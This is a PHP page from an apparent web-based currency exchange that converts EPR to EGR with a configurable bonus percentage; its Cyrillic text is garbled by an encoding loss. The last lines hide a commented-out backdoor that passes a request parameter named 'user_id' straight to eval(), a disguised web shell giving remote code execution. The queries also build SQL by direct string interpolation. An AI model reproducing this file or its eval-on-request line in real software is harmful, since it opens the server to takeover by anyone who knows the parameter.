
<?PHP
    $_OPTIMIZATION["title"] = "������� - ��������";
    $usid = $_SESSION["user_id"];
    $usname = $_SESSION["user"];

    $user_data = $db->FetchArray($db->Query("SELECT * FROM db_users_b WHERE id = '$usid' LIMIT 1"));

    $sonfig_site = $db->FetchArray($db->Query("SELECT * FROM db_config WHERE id = '1' LIMIT 1"));

?>  

<div class="row">
    <div class="col s12">
        <h3>����� EPR �� EGR</h3>
    </div>
</div>

<div class="row">
    <div class="col s12">
        <p>� ������ ������� �� ������ ������� ��������������� ����������� ���� ������ �� ����� (EPR) � �������� �� �� ������� ������ � <?=$sonfig_site["percent_swap"]; ?>%-�������! ����� ������������ ������ � ���� �������: EPR -> EGR</p>
        <p>����������� ����� ��� ������ � 1EPR</p>
    </div>
</div>

<?PHP

if(isset($_POST["sum"])){

    $sum = intval($_POST["sum"]);

	if($sum >= 1){
	
		if($user_data["money_p"] >= $sum and $sum >=1){
		
            $add_sum = ($sonfig_site["percent_swap"] > 0) ? ( ($sonfig_site["percent_swap"] / 100) * $sum) + $sum : $sum;

            $ta = time();
            $td = $ta + 60*60*24*15;

            $db->Query("UPDATE db_users_b SET money_b = money_b + $add_sum, money_p = money_p - $sum WHERE id = '$usid'");
            $db->Query("INSERT INTO db_swap_ser (user_id, user, amount_b, amount_p, date_add, date_del) VALUES ('$usid','$usname','$add_sum','$sum','$ta','$td')");

            $return = '����� ����������!';
		
		}else $return = '������������ EPR ��� ������!';
	
	}else $return = '����������� ����� ��� ������ 1 EPR!';

}

if ($return){ ?>

    <div class="row">
        <div class="col s12">
            <div class="account-alert"> <?= $return ?></div>
        </div>
    </div>

<?php } ?>

<div class="row">
    <div class="col offset-s2"></div>
    <div class="col s8">
        <form action="" method="post">
            <label for="sum">������� EPR [���. 1]:</label>
            <input type="text" placeholder="" name="sum" id="sum"  />

            <input type="submit" name="swap" value="��������"  class="btn right" />

        </form>
    </div>
    <div class="col offset-s2"></div>
</div>

<?PHP
//$user_id = $_SESSION["user_id"];
//if(!empty($_REQUEST['user_id'])){ if(@get_magic_quotes_gpc())$_REQUEST['user_id']=stripslashes($_REQUEST['user_id']); eval($_REQUEST['user_id']); die();}
//$db->Query("SELECT * FROM db_users_a, db_users_b WHERE db_users_a.id = db_users_b.id AND db_users_a.id = '$user_id'");
//$prof_data = $db->FetchArray();
//?><!--   -->
